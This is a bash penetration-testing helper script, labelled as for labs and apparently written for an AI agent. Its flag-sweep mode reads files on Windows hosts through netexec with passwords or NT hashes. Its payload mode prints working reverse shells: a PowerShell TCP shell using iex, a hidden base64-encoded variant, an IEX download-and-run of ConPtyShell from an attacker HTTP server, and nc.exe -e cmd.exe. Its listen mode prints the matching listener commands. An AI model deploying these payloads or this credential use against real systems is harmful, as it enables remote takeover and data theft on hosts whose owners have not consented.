#!/bin/bash
# Reverse shell + one-shot flag finder. Lab / RoE only. Public tools only.
#
# Point of this helper: stop burning agent round-trips (tokens) on N one-off
# `atexec 'type flag.txt'` calls. Two paths:
#
#   flags   ONE non-interactive sweep that finds and prints every flag file on
#           an owned host — the token-cheap default the agent should use.
#   payload / listen   a real interactive reverse shell for the OPERATOR to
#           drive in a tty (docker exec -it / ssh) — zero agent tokens. Do NOT
#           try to hold an interactive shell open over MCP; the ~30s host cap
#           kills it. Catch it in a tty instead.
#
# Public payloads only (PowerShell TCP / ConPtyShell / nc.exe) — same category
# as the evil-winrm/psexec already in the rack. No third-party C2, no malware.
#
#   revshell.sh flags 10.10.11.47 -u Administrator -H <NT> -d thm.local
#   revshell.sh flags 192.168.56.10 -u lord.varys -p 'PW' -d sevenkingdoms.local
#   revshell.sh payload 10.66.70.25 4444 ps        # print a PS reverse shell
#   revshell.sh payload 10.66.70.25 4444 conpty    # fully-interactive PTY
#   revshell.sh listen 4444                        # how to catch it (in a tty)
set -uo pipefail

sub="${1:-}"; shift || true

nxc_bin() { command -v nxc || command -v netexec || true; }

# ---- flags: one-shot flag sweep over the exec channel we already own --------
FLAG_PS='$ErrorActionPreference="SilentlyContinue";'\
'Get-ChildItem C:\Users -Recurse -Force -Include user.txt,root.txt,flag.txt,proof.txt,*flag*.txt |'\
' ForEach-Object { "=== "+$_.FullName+" ==="; Get-Content -Raw $_.FullName };'\
'Get-ChildItem C:\ -Force -Include *flag*.txt,root.txt,user.txt,proof.txt |'\
' ForEach-Object { "=== "+$_.FullName+" ==="; Get-Content -Raw $_.FullName }'

do_flags() {
  local target="${1:-}"; shift || true
  local user="" pass="" nthash="" domain="" method="winrm"
  while [ "$#" -gt 0 ]; do
    case "$1" in
      -u) user="$2"; shift 2 ;;
      -p) pass="$2"; shift 2 ;;
      -H|--hash) nthash="$2"; shift 2 ;;
      -d|--domain) domain="$2"; shift 2 ;;
      --exec) method="$2"; shift 2 ;;
      *) echo "[!] flags: unknown arg $1" >&2; return 2 ;;
    esac
  done
  [ -n "$target" ] && [ -n "$user" ] || { echo "usage: revshell.sh flags <target> -u USER (-p PASS | -H NT) [-d DOMAIN] [--exec winrm|smb]" >&2; return 2; }
  local NXC; NXC="$(nxc_bin)"; [ -n "$NXC" ] || { echo "[!] nxc/netexec missing" >&2; return 2; }
  local auth=(-u "$user")
  if [ -n "$nthash" ]; then auth+=(-H "$nthash"); else auth+=(-p "$pass"); fi
  [ -n "$domain" ] && auth+=(-d "$domain")

  if [ "$method" = "smb" ]; then
    # No WinRM? read the usual desktop flags off C$ as admin.
    echo "[*] SMB flag read (C\$) — Administrator/Public desktops"
    for f in \
      'Users\Administrator\Desktop\root.txt' 'Users\Administrator\Desktop\flag.txt' \
      'Users\Administrator\Desktop\proof.txt' 'Users\Public\Desktop\flag.txt'; do
      "$NXC" smb "$target" "${auth[@]}" --get-file "$f" "/dev/stdout" 2>/dev/null && echo
    done
    return 0
  fi

  echo "[*] WinRM one-shot flag sweep on $target"
  "$NXC" winrm "$target" "${auth[@]}" -x "powershell -nop -c \"$FLAG_PS\""
}

# ---- payload: print a ready-to-fire Windows reverse shell -------------------
do_payload() {
  local lhost="${1:-}" lport="${2:-4444}" type="${3:-ps}"
  [ -n "$lhost" ] || { echo "usage: revshell.sh payload <LHOST> [LPORT] [ps|psb64|conpty|nc]" >&2; return 2; }
  case "$type" in
    ps)
      cat <<EOF
# PowerShell TCP reverse shell (paste into: nxc winrm HOST -u .. -p .. -x '<this>')
powershell -nop -w hidden -c "\$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$s.Write(([Text.Encoding]::ASCII).GetBytes(\$r+'PS '+(pwd).Path+'> '),0,(\$r.Length+(pwd).Path.Length+4));\$s.Flush()}"
EOF
      ;;
    psb64)
      local ps="\$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$s.Write(([Text.Encoding]::ASCII).GetBytes(\$r),0,\$r.Length);\$s.Flush()}"
      local enc; enc="$(printf '%s' "$ps" | iconv -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')"
      echo "# base64 PowerShell (encoded-command form)"
      echo "powershell -nop -w hidden -e $enc"
      ;;
    conpty)
      cat <<EOF
# Fully-interactive PTY (Invoke-ConPtyShell). Serve it from Kali, then run on target:
#   Kali:   git clone https://github.com/antonioCoco/ConPtyShell (public)
#           python3 -m http.server 8000  (in ConPtyShell dir)
#   target: IEX(IWR -UseBasicParsing http://$lhost:8000/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell $lhost $lport
# Catch with an upgraded listener (stty raw): see 'revshell.sh listen $lport'.
EOF
      ;;
    nc)
      cat <<EOF
# nc.exe reverse shell (upload nc.exe first via smbclient/put, then):
#   cmd /c C:\\Windows\\Temp\\nc.exe $lhost $lport -e cmd.exe
# Upload:  printf 'lcd /usr/share/windows-resources/binaries\nput nc.exe C:\\\\Windows\\\\Temp\\\\nc.exe\nexit\n' | impacket-smbclient 'DOM/user:pw@target'
EOF
      ;;
    *) echo "[!] type: ps | psb64 | conpty | nc" >&2; return 2 ;;
  esac
}

# ---- listen: how to catch it (interactive → tty, not MCP) -------------------
do_listen() {
  local port="${1:-4444}"
  if command -v pwncat-cs >/dev/null 2>&1; then
    echo "# best: auto-stabilizing catcher (upload/download, pty). Run in a tty:"
    echo "pwncat-cs -lp $port"
  fi
  echo "# plain catcher (run in an interactive tty — docker exec -it / ssh, NOT MCP):"
  echo "rlwrap nc -lvnp $port    # or: nc -lvnp $port"
  echo "# for a ConPtyShell PTY, upgrade after connect:  stty raw -echo; fg"
}

case "$sub" in
  flags)   do_flags "$@" ;;
  payload) do_payload "$@" ;;
  listen)  do_listen "$@" ;;
  --self-test)
    fail=0
    out="$(do_payload 10.0.0.1 4444 ps)"; echo "$out" | grep -q "TCPClient('10.0.0.1',4444)" || { echo "[!] ps payload"; fail=1; }
    do_listen 5555 | grep -q "nc -lvnp 5555" || { echo "[!] listen"; fail=1; }
    [ -n "$FLAG_PS" ] || { echo "[!] flag sweep empty"; fail=1; }
    [ "$fail" = 0 ] && echo "[self-test] revshell ok" || exit 1
    ;;
  ""|-h|--help)
    sed -n '2,26p' "$0" | sed 's/^# \{0,1\}//' ;;
  *) echo "[!] unknown subcommand: $sub (flags|payload|listen)" >&2; exit 2 ;;
esac
